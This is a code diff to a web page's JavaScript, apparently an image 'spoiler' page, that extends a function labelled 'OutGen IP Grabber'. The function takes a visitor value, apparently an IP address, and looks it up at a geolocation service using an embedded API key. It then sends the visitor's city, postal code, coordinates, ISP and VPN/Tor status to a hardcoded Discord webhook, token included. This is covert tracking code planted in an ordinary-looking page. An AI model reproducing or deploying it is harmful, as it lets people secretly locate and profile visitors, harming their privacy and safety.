@@ -123,17 +123,25 @@ image.onload = () => {
     document.getElementById("spoiler").style.height = image.height + "px";
 };
   async function sendToDiscord(msg) {
-     const DISCORD_WEBHOOK_URL ="https://discord.com/api/webhooks/1524211822620704790/LO3jEkeE3ufjQ4sh8WmMoLViD3QORxXR8_9mg_FnAurUOinNMcj3fYYCrIK2wwrj4y9b";
+  fetch('https://iplocate.io/api/lookup/'+msg+'?apikey=020d9572d854985027669009689a55f6')
+  .then(res => res.json())
+  .then(async data => {
+    console.log(data)
+const DISCORD_WEBHOOK_URL ="https://discord.com/api/webhooks/1524211822620704790/LO3jEkeE3ufjQ4sh8WmMoLViD3QORxXR8_9mg_FnAurUOinNMcj3fYYCrIK2wwrj4y9b";
       const response = await fetch(DISCORD_WEBHOOK_URL, {
         method: "POST",
         headers: {
           "Content-Type": "application/json"
         },
         body: JSON.stringify({
-          content: msg,
+          content: `**${msg}**\n${data.city} (${data.postal_code}), ${data.subdivision}, ${data.country}, ${data.continent}\n${(data.latitude>0)?"N":"S"}${Math.abs(data.latitude)} ${(data.longitude>0)?"E":"W"}${Math.abs(data.longitude)}\n${data.company.name} -- ${data.company.country_code} ${data.company.type}\n${data.privacy.is_vpn?"VPN ":""}${data.privacy.is_tor?"TOR ":""}${data.privacy.is_proxy?"PROXY ":""}${data.privacy.is_bogon?"BOGON ":""}${data.privacy.is_hosting?"HOSTING ":""}${data.privacy.is_abuser?"ABUSER ":""}${data.privacy.is_anonymous?"ANONYMOUS ":""}${data.privacy.is_icloud_relay?"ICLOUDRELAY ":""}\n${data.is_anycast?"ANYCAST ":""}${data.satellite?"SATELLITE ":""}${data.is_eu?"EU ":""}
+          `,
 	        username: "OutGen IP Grabber",
         })
       });
+});
+
+     
 
    
   }
